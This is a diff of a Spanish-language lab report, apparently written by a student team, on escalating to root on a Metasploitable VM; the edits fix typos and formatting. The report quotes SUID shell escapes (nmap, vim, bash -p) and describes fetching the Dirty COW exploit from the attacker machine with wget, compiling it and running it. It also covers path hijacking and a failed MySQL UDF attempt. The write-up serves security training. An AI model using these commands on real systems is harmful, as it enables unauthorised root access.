@@ -93,7 +93,7 @@ msfadmin@metasploitable:~$
 
 *Figura: Captura de la comprobación de usuario tras la conexión SSH.*
 
-Luego de ello se ejecutaron los coamndos `whoami` e `id` para verificar el nombre de usuario, el nombre del grupo principal al cual pertenece y sus GID(Identificadores de grupo) para verficiar que efectivamente se accdeió con el usaurio "msfadmin" de la máquina objetvio desde la máquina atacante.
+Luego de ello se ejecutaron los coamndos `whoami` e `id` para verificar el nombre de usuario, el nombre del grupo principal al cual pertenece y sus GID(Identificadores de grupo) para verficar que efectivamente se accdeió con el usuario "msfadmin" de la máquina objetvio desde la máquina atacante.
 
 ```sh
 msfadmin@metasploitable:~$ whoami
@@ -102,18 +102,18 @@ msfadmin@metasploitable:~$ id
 uid=1001(msfadmin) gid=1001(msfadmin) groups=1001(msfadmin)
 ```
 
-Luego de ello, se procedió a crear el directorio de trabajo con el comando mkdir, donde se dejaran los archivos de evidencia necesarios para demostrar la escalada de privilegios exitosa y por último se uso el comando cd para cambiar el directorio actaul al creado para comprobar que fue creado sin problemas.
+Luego de ello, se procedió a crear el directorio de trabajo con el comando `mkdir`, donde se dejarán los archivos de evidencia necesarios para demostrar la escalada de privilegios exitosa y por último se uso el comando cd para cambiar el directorio actaul al creado para comprobar que fue creado sin problemas.
 
 `mkdir -p /tmp/equipo4\_privesc`
 
 `cd /tmp/equipo4\_privesc`
 
 -----
-### 🎯 TÉCNICA 1: Explotación de Binarios SUID**
+### 🎯 TÉCNICA 1: Explotación de Binarios SUID
 
 El primer método a probar es la explotación de los archivos con bit SUID ya que estos se ejecutan con los permisos del propietario (generalmente root), no del usuario que los ejecuta.
 
-El SUID(**Set User ID**) es un permiso especial en los sistemas operativos tipo UNIX que como se estableció arriba permite que cualquier usuario ejecuta los archivos con los permisos que posee el usuario propietario del archivo, esto es una vulnerabilidad que puede ser explotada con el motivo de conseguir acceso no autorizado al sistema.
+El SUID(**Set User ID**) es un permiso especial en los sistemas operativos tipo UNIX, que como se estableció arriba, permite que cualquier usuario ejecute los archivos con los permisos que posee el usuario propietario del archivo, esto es una vulnerabilidad que puede ser explotada con el motivo de conseguir acceso no autorizado al sistema.
 
 ##### **Paso 1: Identificar Binarios SUID**
 
@@ -136,13 +136,13 @@ Se ejecutó el comando `ls -la /usr/bin/nmap` para comprobar que nmap contiene e
 
 Se ejecuto `nmap --interactive` para ejecutar el programa de nmap en modo interactivo, cabe destacar que al tener el bit SUID encendido el proceso temporalmente los privilegios de su propietario, en este caso root.
 
-Posteriormente se ejecutó `nmap> !sh` para abrir una shell, una shell es un programa que actúa como una **interfaz de línea de comandos (CLI)** entre el **usuario** y el **núcleo (kernel) del sistema operativo**. Al haberse ejecutado el proceso con los permisos de root, la shell resultante hereda los mismos lo que hace que la escalada de privilegios sea exitos al ahora tener el usuario root en control para ejecutar acciones sobre el objetivo.
+Posteriormente se ejecutó `nmap> !sh` para abrir una shell, una shell es un programa que actúa como una **interfaz de línea de comandos (CLI)** entre el **usuario** y el **núcleo (kernel) del sistema operativo**. Al haberse ejecutado el proceso con los permisos de root, la shell resultante hereda los mismos lo que hace que la escalada de privilegios sea exitosa al ahora tener el usuario root en control para ejecutar acciones sobre el objetivo.
 
 Para comprobar que efectivamente ahora se está en el usuario root se ejecutaron los coamndos `whoami` y `id` para verificar el usuario actual y sus diferentes IDs correspondientes a su rol dentro del sistema dando como resultado la escalada exitosa como se puede ver en la imagen de abajo.
 
 ![acceso-root](https://imgur.com/uT5YY2h)
 
-Por último, se ejecutó `echo "Root via nmap SUID - Equipo 4" > /root/equipo4\_nmap\_root.txt` para escribir dentro u=de un archivo txt ubicado en la carpeta root un mensaje que sirva como prueba irrefutable de que se logró la escalada de privilegios en el sistema.
+Por último, se ejecutó `echo "Root via nmap SUID - Equipo 4" > /root/equipo4\_nmap\_root.txt` para escribir dentro de un archivo txt ubicado en la carpeta root un mensaje que sirva como prueba irrefutable de que se logró la escalada de privilegios en el sistema.
 
 #### **Paso 3: Explotar otros binarios SUID comunes**
 
@@ -164,7 +164,7 @@ vim -c ':!/bin/sh'
 
 /bin/bash -p
 
-Los comandos ubicados previamente a este párrafo fueron ejecutado pero fueron redundantes al ya haber escalado los privilegios mediante la explotación de la verisón antigua de nmap por lo que nos detallará tanto en ellos, lo que se hará es presentar tablas con los componentes de cada comando y explicar su función dentro de la escalada de privilegios.
+Los comandos ubicados previamente a este párrafo fueron ejecutado pero fueron redundantes al ya haber escalado los privilegios mediante la explotación de la versión antigua de nmap por lo que nos detallará tanto en ellos, lo que se hará es presentar tablas con los componentes de cada comando y explicar su función dentro de la escalada de privilegios.
 
 | Comando | Acción | Resultado con SUID |
 | :--- | :--- | :--- |
@@ -189,7 +189,7 @@ Comando | Acción | Resultado con SUID |
 **Comando Completo:** `/bin/bash -p`
 
 -----
-### 🎯 TÉCNICA 2: Explotación del Kernel**
+### 🎯 TÉCNICA 2: Explotación del Kernel
 
 El segundo método a probar es la explotación del Kernel debido a que Kernels antiguos tienen vulnerabilidades conocidas que permiten escalada de privilegios local.
 
@@ -197,7 +197,7 @@ El segundo método a probar es la explotación del Kernel debido a que Kernels a
 
 Se ejecutaron los comandos `uname -a`, `cat /etc/issue`, `cat /proc/version` y `uname -a > /tmp/equipo4\_privesc/kernel\_info.txt` ya que son herramientas escenciales en el proceso de information gathering(recopilación de información) del objetivo del ataque, estos comandos permiten obtener información sobre la versión y distribución del sistema operativo.
 
-A continuacuión se presenta una tabla con los comandos utilizados para mostrar su estcuvutra y su utilidad en esta fase de recopilación de información del objetivo.
+A continuación se presenta una tabla con los comandos utilizados para mostrar su estructura y su utilidad en esta fase de recopilación de información del objetivo.
 
 | Comando | Función Principal | Información Específica Recopilada |
 | :--- | :--- | :--- |
@@ -214,7 +214,7 @@ La herramienta de linea de comandos `searchsploit` es una que viene incluida en 
 
 Es importante mencionar que Exploit-DB es mantenida y desarrollada por **OffSec(Offensive Security)**, una organización líder en el campo de la ciberseguridad y el hacking ético, de igual forma esta misma organización está detrás de la distribución usada por "analista" la cual es Kali Linux.
 
-A continuación se presenta una tabla con los comandos previamente mencionados donde se explica su propisto y funcionmiento dentro del contexto de la seguridad del sistema.
+A continuación se presenta una tabla con los comandos previamente mencionados donde se explica su proposito y funcionamiento dentro del contexto de la seguridad del sistema.
 
 | Comando | Propósito | Contexto de Seguridad |
 | :--- | :--- | :--- |
@@ -224,11 +224,11 @@ A continuación se presenta una tabla con los comandos previamente mencionados d
 
 **Paso 3: Usar Exploit Pre-compilado (Ejemplo: Dirty COW)**
 
-Se ejecutó el comando `searchsploit -m 40839` para mostrar, copiar y extraer el codigo fuente del exploit con ID 40839, esto se logro mediante la opcion `-m`(Mirroing) ya que está le indica a la herramienta que no solo busque el exploit sino que también haga una copia desde la base de datos local hacia el directorio actual donde se ejecutó el comando.
+Se ejecutó el comando `searchsploit -m 40839` para mostrar, copiar y extraer el codigo fuente del exploit con ID 40839, esto se logró mediante la opción `-m`(Mirroing) ya que esta le indica a la herramienta que no solo busque el exploit sino que también haga una copia desde la base de datos local hacia el directorio actual donde se ejecutó el comando.
 
 En este caso, el exploit a utilizar es uno correspondiente a una escalada de privilegios de Linux conocido como "Dirty COW" (CVE-2016-5195).
 
-Para transferir el exploit a la máquina objetivo se decidió levantar un servidor HTTP mediante el comando `python3 -m http.server 8000`en la máquina atacante, la máquina "analista", para hacerla un servidor de archivos temporal ya que con esto se tiene un medio de entrega del exploit al objetivo al tener abierta en el atacante una terminal del objetivo mediante SSH, acción realizada por el equipo 2 en su parte del ataqye.
+Para transferir el exploit a la máquina objetivo se decidió levantar un servidor HTTP mediante el comando `python3 -m http.server 8000`en la máquina atacante, la máquina "analista", para hacerla un servidor de archivos temporal ya que con esto se tiene un medio de entrega del exploit al objetivo al tener abierta en el atacante una terminal del objetivo mediante SSH, acción realizada por el equipo 2 en su parte del ataque.
 
 Por ello, en la terminal SSH se ejecutan los comandos `cd /tmp/equipo4\_privesc` y `wget http://192.168.100.9:8000/40839.c`para primero moverse al directorio tmp ya que es uno universalmente **accesible** y **escribible** por casi cualquier usuario en sistemas Linux, por lo que es ideal para descargar archivos temporales sin preocuparse por los permisos iniciales y luego descargar el archivo del exploit en el directorio actual para luego ser compilado y ejecutado.
 
@@ -238,7 +238,7 @@ Se compiló el archivo del exploit previamente descargado mediante el comando `g
 
 Luego se ejecutó el archivo binario mediante el comando `./40839` y se siguieron las instrucciones del mismo para crear un usuario con los privilegios con el objetivo de lograr la escalada de privilegios.
 
-Para comprobar que se logró la escalada se ejecutaron los comandos `su firefart`, `whoami` y `id`, solo se explicará el funcionamiento del primer comando ya que los otros dos fueron explicados en la técnica 1.
+Para comprobar que se logró la escalada se ejecutaron los comandos `su firefart`, `whoami` y `id`, sólo se explicará el funcionamiento del primer comando ya que los otros dos fueron explicados en la técnica 1.
 
 El comando `su firefart` sirve para cambiar el usuario de la sesión actual al usuario **firefart**, que fue creado por el exploit, para luego ejecutar los dos comandos siguientes para comprobar que tiene privilegios de root. Los comandos `whoami` y `id` tuvieron la siguiente salida:
 ```sh
@@ -253,7 +253,7 @@ Cabe destacar que previamente se ejecutó`su firefart` para hacer el cambio de u
 
 -----
 
-### **🎯 TÉCNICA 3: Explotación de Sudo Mal Configurado**
+### 🎯 TÉCNICA 3: Explotación de Sudo Mal Configurado
 
 El tercer método a probar es la explotación de la utilidad sudo, ya que si esta se encuentra mal configurada puede permitir que un usuario con pocos privilegios ejecute comandos como si fuera el usuario root.
 
@@ -344,7 +344,7 @@ root
 
 -----
 
-**🎯 TÉCNICA 4: Explotación de Tareas Cron**
+### 🎯 TÉCNICA 4: Explotación de Tareas Cron
 
 No se pudo ejectuar la técnica ya que el directorio `/etc/cron.\*` no se encuentra en la máquina objetivo.
 
@@ -376,7 +376,7 @@ root@metasploitable:/home/msfadmin#
 
 Se intentó explotar el servicio de MySQL para escalar privilegios mediante una User Defined Function (UDF). La técnica consiste en subir una librería maliciosa (`.so`) al servidor y crear una función que ejecute comandos del sistema con los privilegios del servicio de MySQL (que a menudo es `root`).
 
-**Paso 1: Intentar Cargar la UDF en MySQL**
+#### **Paso 1: Intentar Cargar la UDF en MySQL**
 
 Se accedió a la consola de MySQL y se intentó cargar el archivo `raptor_udf2.so`, un exploit conocido para esta técnica. Sin embargo, los comandos fallaron, principalmente porque el archivo no se encontraba en el sistema.
 
@@ -398,7 +398,7 @@ mysql> exit
 Bye
 ```
 
-**Paso 2: Confirmar Ausencia del Archivo**
+#### **Paso 2: Confirmar Ausencia del Archivo**
 
 Para confirmar la causa del fallo, se verificó si el archivo `raptor_udf2.so` existía en el directorio `/tmp`, confirmando que no estaba presente.
 
@@ -410,7 +410,7 @@ cat: /tmp/raptor_udf2.so: No such file or directory
 Debido a que no se contaba con el archivo del exploit (`raptor_udf2.so`) en la máquina objetivo, no fue posible completar esta técnica y se decidió continuar con la siguiente.
 
 -----
-**🎯 TÉCNICA 6: Path Hijacking**
+### 🎯 TÉCNICA 6: Path Hijacking
 
 **Contexto**
 
@@ -450,7 +450,7 @@ En nuestro caso, esta técnica resultó ser la más fluida y fácil de ejecutar,
 
 -----
 
-### **🎯 TÉCNICA BONUS: Metasploit Local Exploit Suggester**
+### 🎯 TÉCNICA BONUS: Metasploit Local Exploit Suggester
 
 Este método emplea el **Metasploit Framework** (`msfconsole`) para automatizar tanto la explotación inicial de un servicio vulnerable como el proceso de identificación y sugerencia de exploits de escalada de privilegios local.
 
